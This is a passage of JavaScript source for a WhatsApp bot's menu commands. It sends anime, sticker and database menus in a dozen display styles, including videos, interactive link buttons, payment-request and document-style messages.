            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner ??","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'animemenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${animemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stickermenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${stickermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'databasemenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${databasemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
